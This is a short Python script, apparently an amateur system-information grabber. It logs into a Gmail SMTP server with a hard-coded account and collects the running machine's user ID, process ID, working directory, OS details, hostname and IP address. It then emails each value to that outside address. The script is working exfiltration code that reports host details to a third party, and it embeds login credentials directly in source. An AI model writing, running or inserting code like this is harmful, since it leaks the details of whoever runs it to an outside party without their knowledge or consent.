import os # To get the OS Details
import time
import smtplib # For SMTP
import socket
user="coolv926@gmail.com"#write your mail id 
kiyo="Dontusemine" #Your Password
xnome="coolv926@gmail.com" #write your email id
server=smtplib.SMTP("smtp.gmail.com","587")
server.starttls()
server.login(xnome,kiyo) #Email Authentication
unumber = os.getuid() # User Id
pnumber = os.getpid() # User PID
where = os.getcwd()
what = os.uname()
used = os.times()
now = time.time()
means = time.ctime(now)
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname) 
a=str(unumber)
b=str(pnumber)
c=where
d=str(what)
e,f,g,h,i=d.split(",")
j=str(used)
k=str(now)
l=list(means)
m=str(l)
n=str(hostname)
o=str(IPAddr)
server.sendmail("coolv926@gmail.com",user,a)
server.sendmail("coolv926@gmail.com",user,b)
server.sendmail("coolv926@gmail.com",user,c)
server.sendmail("coolv926@gmail.com",user,e)
server.sendmail("coolv926@gmail.com",user,f)
server.sendmail("coolv926@gmail.com",user,g)
server.sendmail("coolv926@gmail.com",user,h)
server.sendmail("coolv926@gmail.com",user,i)
server.sendmail("coolv926@gmail.com",user,j)
server.sendmail("coolv926@gmail.com",user,k)
server.sendmail("coolv926@gmail.com",user,m)
server.sendmail("coolv926@gmail.com",user,n)
server.sendmail("coolv926@gmail.com",user,o)
server.quit()



